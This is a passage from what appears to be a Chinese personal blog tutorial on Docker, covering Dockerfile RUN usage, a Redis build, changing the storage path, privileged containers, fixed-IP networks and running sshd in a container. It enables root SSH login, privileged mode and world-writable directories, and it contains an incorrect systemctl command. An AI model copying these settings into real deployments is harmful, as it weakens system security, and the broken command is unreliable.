buster+</span></span><br><span class="line">echo <span class="string">'deb http://deb.debian.org/debian stretch-backports main'</span> &gt;&gt; /etc/apt/sources.list.d/pgdg.list; \</span><br><span class="line">;; \</span><br><span class="line">esac; \</span><br><span class="line">\</span><br><span class="line">tempDir=<span class="string">"$(mktemp -d)"</span>; \</span><br><span class="line">cd <span class="string">"<span class="variable">$tempDir</span>"</span>; \</span><br><span class="line">\</span><br><span class="line">savedAptMark=<span class="string">"$(apt-mark showmanual)"</span>; \</span><br><span class="line">\</span><br><span class="line"><span class="comment"># build .deb files from upstream's source packages (which are verified by apt-get)</span></span><br><span class="line">apt-get update; \</span><br><span class="line">apt-get build-dep -y \</span><br><span class="line">postgresql-common pgdg-keyring \</span><br><span class="line"><span class="string">"postgresql-<span class="variable">$PG_MAJOR</span>=<span class="variable">$PG_VERSION</span>"</span> \</span><br><span class="line">; \</span><br><span class="line">DEB_BUILD_OPTIONS=<span class="string">"nocheck parallel=$(nproc)"</span> \</span><br><span class="line">apt-get source --compile \</span><br><span class="line">postgresql-common pgdg-keyring \</span><br><span class="line"><span class="string">"postgresql-<span class="variable">$PG_MAJOR</span>=<span class="variable">$PG_VERSION</span>"</span> \</span><br><span class="line">; \</span><br><span class="line"><span class="comment"># we don't remove APT lists here because they get re-downloaded and removed later</span></span><br><span class="line">\</span><br><span class="line"><span class="comment"># reset apt-mark's "manual" list so that "purge --auto-remove" will remove all build dependencies</span></span><br><span class="line"><span class="comment"># (which is done after we install the built packages so we don't have to redownload any overlapping dependencies)</span></span><br><span class="line">apt-mark showmanual | xargs apt-mark auto &gt; /dev/null; \</span><br><span class="line">apt-mark manual <span class="variable">$savedAptMark</span>; \</span><br><span class="line">\</span><br><span class="line"><span class="comment"># create a temporary local APT repo to install from (so that dependency resolution can be handled by APT, as it should be)</span></span><br><span class="line">ls -lAFh; \</span><br><span class="line">dpkg-scanpackages . &gt; Packages; \</span><br><span class="line">grep <span class="string">'^Package: '</span> Packages; \</span><br><span class="line">echo <span class="string">"deb [ trusted=yes ] file://<span class="variable">$tempDir</span> ./"</span> &gt; /etc/apt/sources.list.d/temp.list; \</span><br><span class="line"><span class="comment"># work around the following APT issue by using "Acquire::GzipIndexes=false" (overriding "/etc/apt/apt.conf.d/docker-gzip-indexes")</span></span><br><span class="line"><span class="comment">#   Could not open file /var/lib/apt/lists/partial/_tmp_tmp.ODWljpQfkE_._Packages - open (13: Permission denied)</span></span><br><span class="line"><span class="comment">#   ...</span></span><br><span class="line"><span class="comment">#   E: Failed to fetch store:/var/lib/apt/lists/partial/_tmp_tmp.ODWljpQfkE_._Packages  Could not open file /var/lib/apt/lists/partial/_tmp_tmp.ODWljpQfkE_._Packages - open (13: Permission denied)</span></span><br><span class="line">apt-get -o Acquire::GzipIndexes=false update; \</span><br><span class="line">;; \</span><br><span class="line">esac; \</span><br><span class="line">\</span><br><span class="line">apt-get install -y postgresql-common; \</span><br><span class="line">sed -ri <span class="string">'s/#(create_main_cluster) .*$/\1 = false/'</span> /etc/postgresql-common/createcluster.conf; \</span><br><span class="line">apt-get install -y \</span><br><span class="line"><span class="string">"postgresql-<span class="variable">$PG_MAJOR</span>=<span class="variable">$PG_VERSION</span>"</span> \</span><br><span class="line">; \</span><br><span class="line">\</span><br><span class="line">rm -rf /var/lib/apt/lists/*; \</span><br><span class="line">\</span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$tempDir</span>"</span> ]; then \</span><br><span class="line"><span class="comment"># if we have leftovers from building, let's purge them (including extra, unnecessary build deps)</span></span><br><span class="line">apt-get purge -y --auto-remove; \</span><br><span class="line">rm -rf <span class="string">"<span class="variable">$tempDir</span>"</span> /etc/apt/sources.list.d/temp.list; \</span><br><span class="line">fi; \</span><br><span class="line">\</span><br><span class="line"><span class="comment"># some of the steps above generate a lot of "*.pyc" files (and setting "PYTHONDONTWRITEBYTECODE" beforehand doesn't propagate properly for some reason), so we clean them up manually (as long as they aren't owned by a package)</span></span><br><span class="line">find /usr -name <span class="string">'*.pyc'</span> -type f -exec bash -c <span class="string">'for pyc; do dpkg -S "$pyc" &amp;&gt; /dev/null || rm -vf "$pyc"; done'</span> -- <span class="string">'&#123;&#125;'</span> +</span><br><span class="line"></span><br><span class="line"><span class="comment"># make the sample config easier to munge (and "correct by default")</span></span><br><span class="line">RUN set -eux; \</span><br><span class="line">dpkg-divert --add --rename --divert <span class="string">"/usr/share/postgresql/postgresql.conf.sample.dpkg"</span> <span class="string">"/usr/share/postgresql/<span class="variable">$PG_MAJOR</span>/postgresql.conf.sample"</span>; \</span><br><span class="line">cp -v /usr/share/postgresql/postgresql.conf.sample.dpkg /usr/share/postgresql/postgresql.conf.sample; \</span><br><span class="line">ln -sv ../postgresql.conf.sample <span class="string">"/usr/share/postgresql/<span class="variable">$PG_MAJOR</span>/"</span>; \</span><br><span class="line">sed -ri <span class="string">"s!^#?(listen_addresses)\s*=\s*\S+.*!\1 = '*'!"</span> /usr/share/postgresql/postgresql.conf.sample; \</span><br><span class="line">grep -F <span class="string">"listen_addresses = '*'"</span> /usr/share/postgresql/postgresql.conf.sample</span><br><span class="line"></span><br><span class="line">RUN mkdir -p /var/run/postgresql &amp;&amp; chown -R postgres:postgres /var/run/postgresql &amp;&amp; chmod <span class="number">2777</span> /var/run/postgresql</span><br><span class="line"></span><br><span class="line">ENV PATH <span class="variable">$PATH:</span>/usr/lib/postgresql/<span class="variable">$PG_MAJOR</span>/bin</span><br><span class="line">ENV PGDATA /var/lib/postgresql/<span class="keyword">data</span></span><br><span class="line">RUN mkdir -p <span class="string">"<span class="variable">$PGDATA</span>"</span> &amp;&amp; chown -R postgres:postgres <span class="string">"<span class="variable">$PGDATA</span>"</span> &amp;&amp; chmod <span class="number">777</span> <span class="string">"<span class="variable">$PGDATA</span>"</span> <span class="comment"># this 777 will be replaced by 700 at runtime (allows semi-arbitrary "--user" values)</span></span><br><span class="line">VOLUME /var/lib/postgresql/<span class="keyword">data</span></span><br><span class="line"></span><br><span class="line">COPY docker-entrypoint.sh /usr/local/bin/</span><br><span class="line">RUN ln -s usr/local/bin/docker-entrypoint.sh / <span class="comment"># backwards compat</span></span><br><span class="line">ENTRYPOINT [<span class="string">"docker-entrypoint.sh"</span>]</span><br><span class="line"></span><br><span class="line">EXPOSE <span class="number">5432</span></span><br><span class="line">CMD [<span class="string">"postgres"</span>]</span><br></pre></td></tr></table></figure><h4 id="Run-执行命令"><a href="#Run-执行命令" class="headerlink" title="Run 执行命令"></a>Run 执行命令</h4><p><code>Run</code> 指令是用来执行命令行命令.  </p><ul><li><p>shell 格式: run \&lt;命令></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run echo <span class="string">'hello,world'</span> &gt; /usr/local/index.txt</span><br></pre></td></tr></table></figure></li><li><p>exec 格式: run [“可执行文件”, “参数1”, “参数二”]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run apt-get update</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">FROM debian:stretch</span><br><span class="line"></span><br><span class="line">RUN buildDeps=<span class="string">'gcc libc6-dev make wget'</span> \</span><br><span class="line">    &amp;&amp; apt-get update \</span><br><span class="line">    &amp;&amp; apt-get install -y <span class="variable">$buildDeps</span> \</span><br><span class="line">    &amp;&amp; wget -O redis.tar.gz <span class="string">"http://download.redis.io/releases/redis-5.0.3.tar.gz"</span> \</span><br><span class="line">    &amp;&amp; mkdir -p /usr/src/redis \</span><br><span class="line">    &amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=<span class="number">1</span> \</span><br><span class="line">    &amp;&amp; make -C /usr/src/redis \</span><br><span class="line">    &amp;&amp; make -C /usr/src/redis install \</span><br><span class="line">    &amp;&amp; rm -rf /var/lib/apt/lists/* \</span><br><span class="line">    &amp;&amp; rm redis.tar.gz \</span><br><span class="line">    &amp;&amp; rm -r /usr/src/redis \</span><br><span class="line">    &amp;&amp; apt-get purge -y --auto-remove <span class="variable">$buildDeps</span></span><br></pre></td></tr></table></figure><p>首先，之前所有的命令只有一个目的，就是编译、安装 redis 可执行文件。因此没有必要建立很多层，这只是一层的事情。因此，这里没有使用很多个 RUN 对一一对应不同的命令，而是仅仅使用一个 RUN 指令，并使用 &amp;&amp; 将各个所需命令串联起来。将之前的 7 层，简化为了 1 层。在撰写 Dockerfile 的时候，要经常提醒自己，这并不是在写 Shell 脚本，而是在定义每一层该如何构建。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker build -t vagabond1132/image_name &lt;上下文路径/URL/&gt;</span><br></pre></td></tr></table></figure><h3 id="Docker-默认储存位置修改"><a href="#Docker-默认储存位置修改" class="headerlink" title="Docker 默认储存位置修改"></a>Docker 默认储存位置修改</h3><p><code>Centos 7</code> Docker默认的存储地址位于 <code>/var/lib/docker</code>  </p><p>当我们磁盘较小, 需要更改其默认存储;</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/docker.service  </span><br><span class="line"></span><br><span class="line"><span class="comment">#修改内容</span></span><br><span class="line">ExecStart=/usr/bin/dockerd  --graph /new-path/docker</span><br><span class="line"></span><br><span class="line"><span class="comment">#拷贝到新的镜像地址:</span></span><br><span class="line">sudo cp -rf /var/lib/docker/*  /new-path/docker</span><br><span class="line"></span><br><span class="line"><span class="comment">#重新生成配置服务-reload 配置文件</span></span><br><span class="line">systemctl reload daemon-reload</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启Docker</span></span><br><span class="line">systemctl restart docker</span><br><span class="line"></span><br><span class="line"><span class="comment">###详细可以查看日志: 排查信息</span></span><br><span class="line">sudo tailf /var/log/messages</span><br></pre></td></tr></table></figure><h3 id="Docker-–privileged-启动"><a href="#Docker-–privileged-启动" class="headerlink" title="Docker –privileged 启动"></a>Docker –privileged 启动</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name rep9  --privileged=true mips-neokylin-hgdb-v4-rep3:latest /usr/sbin/init  改一下镜像和name</span><br></pre></td></tr></table></figure><h3 id="Docker-创建固定IP"><a href="#Docker-创建固定IP" class="headerlink" title="Docker 创建固定IP"></a>Docker 创建固定IP</h3><h4 id="bridge-桥接网络"><a href="#bridge-桥接网络" class="headerlink" title="bridge:桥接网络"></a>bridge:桥接网络</h4><p>默认情况下启动的Docker容器，都是使用 bridge，Docker安装时创建的桥接网络，每次Docker容器重启时，会按照顺序获取对应的IP地址，这个就导致重启下，Docker的IP地址就变了</p><h4 id="none-无指定网络"><a href="#none-无指定网络" class="headerlink" title="none:无指定网络"></a>none:无指定网络</h4><p>使用 <code>--network=none</code> ，docker 容器就不会分配局域网的IP</p><h4 id="host-主机网络"><a href="#host-主机网络" class="headerlink" title="host:主机网络"></a>host:主机网络</h4><p>使用 <code>--network=host</code>，此时，Docker 容器的网络会附属在主机上，两者是互通的。<br> 例如，在容器中运行一个Web服务，监听8080端口，则主机的8080端口就会自动映射到容器中。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">docker network create --subnet=<span class="number">172.18</span>.<span class="number">0.0</span>/<span class="number">16</span> mynetwork</span><br><span class="line">docker run -itd  --name test --network mynetwork --ip <span class="number">172.18</span>.<span class="number">0.100</span>   mips-neokylin-repmgr:latest /bin/bash</span><br><span class="line"></span><br><span class="line">docker exec -ti test /bin/bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@node2 ~]<span class="comment"># docker exec -ti test /bin/bash</span></span><br><span class="line">[root@fc2872f990ee /]<span class="comment"># </span></span><br><span class="line">[root@fc2872f990ee /]<span class="comment"># </span></span><br><span class="line">[root@fc2872f990ee /]<span class="comment"># ip a</span></span><br><span class="line"><span class="number">1</span>: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="number">65536</span> qdisc noqueue state UNKNOWN qlen <span class="number">1</span></span><br><span class="line">    link/loopback <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> brd <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">    inet <span class="number">127.0</span>.<span class="number">0.1</span>/<span class="number">8</span> scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::<span class="number">1</span>/<span class="number">128</span> scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="number">562</span>: eth0@<span class="keyword">if</span>563: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc noqueue state UP </span><br><span class="line">    link/ether <span class="number">02</span>:<span class="number">42</span>:ac:<span class="number">12</span>:<span class="number">00</span>:<span class="number">64</span> brd ff:ff:ff:ff:ff:ff link-netnsid <span class="number">0</span></span><br><span class="line">    inet <span class="number">172.18</span>.<span class="number">0.100</span>/<span class="number">16</span> scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::<span class="number">42</span>:acff:fe12:<span class="number">64</span>/<span class="number">64</span> scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@fc2872f990ee /]<span class="comment">#</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -h rep01 --name rep01 --network mynetwork --ip <span class="number">172.18</span>.<span class="number">0.101</span> --privileged=true -v /root/highgodb01:/opt/HighGoDB-<span class="number">4.3</span>.<span class="number">4</span>/<span class="keyword">data</span> mips-neokylin-repmgr /usr/sbin/init</span><br></pre></td></tr></table></figure><p>yum -y install openssh-server  openssh-clients<br>yum install initscripts   ## service<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sshd_config：</span><br><span class="line"></span><br><span class="line">​```powershell</span><br><span class="line">#Port 22</span><br><span class="line">#AddressFamily any</span><br><span class="line">#ListenAddress 0.0.0.0</span><br><span class="line">#ListenAddress ::</span><br><span class="line"></span><br><span class="line">HostKey /etc/ssh/ssh_host_rsa_key</span><br><span class="line">#HostKey /etc/ssh/ssh_host_dsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_ed25519_key</span><br><span class="line"></span><br><span class="line"># Ciphers and keying</span><br><span class="line">#RekeyLimit default none</span><br><span class="line"></span><br><span class="line"># Logging</span><br><span class="line">#SyslogFacility AUTH</span><br><span class="line">SyslogFacility AUTHPRIV</span><br><span class="line">#LogLevel INFO</span><br><span class="line"></span><br><span class="line"># Authentication:</span><br><span class="line"></span><br><span class="line">#LoginGraceTime 2m</span><br><span class="line">PermitRootLogin yes   ## 允许root用户登陆;;</span><br><span class="line">#StrictModes yes</span><br><span class="line">#MaxAuthTries 6</span><br><span class="line">#MaxSessions 10</span><br><span class="line"></span><br><span class="line">#PubkeyAuthentication yes</span><br><span class="line"></span><br><span class="line"># The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2</span><br><span class="line"># but this is overridden so installations will only check .ssh/authorized_keys</span><br><span class="line">AuthorizedKeysFile.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">#AuthorizedPrincipalsFile none</span><br><span class="line"></span><br><span class="line">#AuthorizedKeysCommand none</span><br><span class="line">#AuthorizedKeysCommandUser nobody</span><br><span class="line"></span><br><span class="line"># For this to work you will also need host keys in /etc/ssh/ssh_known_hosts</span><br><span class="line">#HostbasedAuthentication no</span><br><span class="line"># Change to yes if you don&apos;t trust ~/.ssh/known_hosts for</span><br><span class="line"># HostbasedAuthentication</span><br><span class="line">#IgnoreUserKnownHosts no</span><br><span class="line"># Don&apos;t read the user&apos;s ~/.rhosts and ~/.shosts files</span><br><span class="line">#IgnoreRhosts yes</span><br><span class="line"></span><br><span class="line"># To disable tunneled clear text passwords, change to no here!</span><br><span class="line">#PasswordAuthentication yes</span><br><span class="line">#PermitEmptyPasswords no</span><br><span class="line">#PasswordAuthentication yes</span><br><span class="line"></span><br><span class="line"># Change to no to disable s/key passwords</span><br><span class="line">#ChallengeResponseAuthentication yes</span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line"># Kerberos options</span><br><span class="line">#KerberosAuthentication no</span><br><span class="line">#KerberosOrLocalPasswd yes</span><br><span class="line">#KerberosTicketCleanup yes</span><br><span class="line">#KerberosGetAFSToken no</span><br><span class="line">#KerberosUseKuserok yes</span><br><span class="line"></span><br><span class="line"># GSSAPI options</span><br><span class="line">GSSAPIAuthentication yes</span><br><span class="line">GSSAPICleanupCredentials no</span><br><span class="line">#GSSAPIStrictAcceptorCheck yes</span><br><span class="line">#GSSAPIKeyExchange no</span><br><span class="line">#GSSAPIEnablek5users no</span><br><span class="line"></span><br><span class="line"># Set this to &apos;yes&apos; to enable PAM authentication, account processing,</span><br><span class="line"># and session processing. If this is enabled, PAM authentication will</span><br><span class="line"># be allowed through the ChallengeResponseAuthentication and</span><br><span class="line"># PasswordAuthentication.  Depending on your PAM configuration,</span><br><span class="line"># PAM authentication via ChallengeResponseAuthentication may bypass</span><br><span class="line"># the setting of &quot;PermitRootLogin without-password&quot;.</span><br><span class="line"># If you just want the PAM account and session checks to run without</span><br><span class="line"># PAM authentication, then enable this but set PasswordAuthentication</span><br><span class="line"># and ChallengeResponseAuthentication to &apos;no&apos;.</span><br><span class="line"># WARNING: &apos;UsePAM no&apos; is not supported in Red Hat Enterprise Linux and may cause several</span><br><span class="line"># problems.</span><br><span class="line">UsePAM yes</span><br><span class="line"></span><br><span class="line">#AllowAgentForwarding yes</span><br><span class="line">#AllowTcpForwarding yes</span><br><span class="line">#GatewayPorts no</span><br><span class="line">X11Forwarding yes</span><br><span class="line">#X11DisplayOffset 10</span><br><span class="line">#X11UseLocalhost yes</span><br><span class="line">#PermitTTY yes</span><br><span class="line">#PrintMotd yes</span><br><span class="line">#PrintLastLog yes</span><br><span class="line">#TCPKeepAlive yes</span><br><span class="line">#UseLogin no</span><br><span class="line">UsePrivilegeSeparation no</span><br><span class="line">#PermitUserEnvironment no</span><br><span class="line">#Compression delayed</span><br><span class="line">#ClientAliveInterval 0</span><br><span class="line">#ClientAliveCountMax 3</span><br><span class="line">#ShowPatchLevel no</span><br><span class="line">#UseDNS yes</span><br><span class="line">#PidFile /var/run/sshd.pid</span><br><span class="line">#MaxStartups 10:30:100</span><br><span class="line">#PermitTunnel no</span><br><span class="line">#ChrootDirectory none</span><br><span class="line">#VersionAddendum none</span><br><span class="line"></span><br><span class="line"># no default banner path</span><br><span class="line">#Banner none</span><br><span class="line"></span><br><span class="line"># Accept locale-related environment variables</span><br><span class="line">AcceptEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES</span><br><span class="line">AcceptEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT</span><br><span class="line">AcceptEnv LC_IDENTIFICATION LC_ALL LANGUAGE</span><br><span class="line">AcceptEnv XMODIFIERS</span><br><span class="line"></span><br><span class="line"># override default of no subsystems</span><br><span class="line">Subsystemsftp/usr/libexec/openssh/sftp-server</span><br><span class="line"></span><br><span class="line"># Example of overriding settings on a per-user basis</span><br><span class="line">#Match User anoncvs</span><br><span class="line">#X11Forwarding no</span><br><span class="line">#AllowTcpForwarding no</span><br><span class="line">#PermitTTY no</span><br><span class="line">#ForceCommand cvs server</span><br></pre></td></tr></table></figure></p><p>启动sshd</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这时报以下错误： </span><br><span class="line">[root@ b3426410ff43 /]<span class="comment"># /usr/sbin/sshd </span></span><br><span class="line">Could not load host key: /etc/ssh/ssh_host_rsa_key </span><br><span class="line">Could not load host key: /etc/ssh/ssh_host_ecdsa_key </span><br><span class="line">Could not load host key: /etc/ssh/ssh_host_ed25519_key</span><br></pre></td></tr></table></figure><p>ssh key: 解决办法:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -q -t rsa -b <span class="number">2048</span> -f /etc/ssh/ssh_host_rsa_key -N <span class="string">''</span> </span><br><span class="line">ssh-keygen -q -t ecdsa -f /etc/ssh/ssh_host_ecdsa_key -N <span class="string">''</span></span><br><span class="line">ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key -N <span class="string">''</span></span><br></pre></td></tr></table></figure><p><strong>将当前容器保存为镜像:</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit f0a4438144f0 vagabond1132/centos_ssh</span><br></pre></td></tr></table></figure><p>显示所有镜像:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vagabond1132/centos_ssh   latest              <span class="number">34</span>ed8e303d64        <span class="number">26</span> seconds ago      <span class="number">294</span>MB</span><br><span class="line">vagabond1132/centos_7     latest              <span class="number">9</span>f38484d220f        <span class="number">4</span> weeks ago         <span class="number">202</span>MB</span><br><span class="line">vagabond1132/centos_7     ssh                 <span class="number">9</span>f38484d220f        <span class="number">4</span> weeks ago         <span class="number">202</span>MB</span><br></pre></td></tr></table></figure><p><strong>基于新镜像启动新的容器</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name conn  -d -p <span class="number">10022</span>:<span class="number">22</span> vagabond1132/centos_ssh:latest /usr/sbin/sshd -D</span><br></pre></td></tr></table></figure><p>查看容器:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CONTAINER ID        IMAGE                            COMMAND               CREATED             STATUS                        PORTS                   NAMES</span><br><span class="line"><span class="number">957</span>bfd4bc7ca        vagabond1132/centos_ssh:latest   <span class="string">"/usr/sbin/sshd -D"</span>   <span class="number">2</span> minutes ago       Up <span class="number">2</span> minutes                  <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">10022</span>-&gt;<span class="number">22</span>/tcp   conn</span><br><span class="line">f0a4438144f0        vagabond1132/centos_7:ssh        <span class="string">"/bin/bash"</span>           About an hour ago   Up About an hour                                      ssh</span><br><span class="line">c9e215a6e5f6        vagabond1132/centos_7:latest     <span class="string">"/bin/bash"</span>           <span class="number">4</span> hours ago         Exited (<span class="number">137</span>) <span class="number">19</span> minutes ago                           mytest</span><br></pre></td></tr></table></figure><p>查看端口: <code>docker port 957bfd4bc7ca</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span>/tcp -&gt; <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">10022</span></span><br></pre></td></tr></table></figure><p>即可登陆:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh root@<span class="number">192.168</span>.<span class="number">102.30</span> -p <span class="number">10022</span></span><br><span class="line">The authenticity of host <span class="string">'[192.168.102.30]:10022 ([192.168.102.30]:10022)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:2cYMWFEiY1Jdu8tD24188+DGW0j6yc6Va7UY5gzrgnQ.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is MD5:b2:16:fd:ab:55:44:4a:76:71:3a:bc:41:b2:58:94:7c.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added '</span>[<span class="number">192.168</span>.<span class="number">102.30</span>]:<span class="number">10022</span><span class="string">' (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">root@192.168.102.30'</span>s password:</span><br></pre></td></tr></table></figure><p><a href="https://yeasy.gitbooks.io/docker_practice/" target="_blank" rel="noopener">Docker学习</a></p><p><a href="https://www.jianshu.com/p/7c9e2247cfbd" target="_blank" rel="noopener">https://www.jianshu.com/p/7c9e2247cfbd</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Bash快捷键</title>
      <link href="/2018/12/05/software/Bash%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
      <url>/2018/12/05/software/Bash%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
      
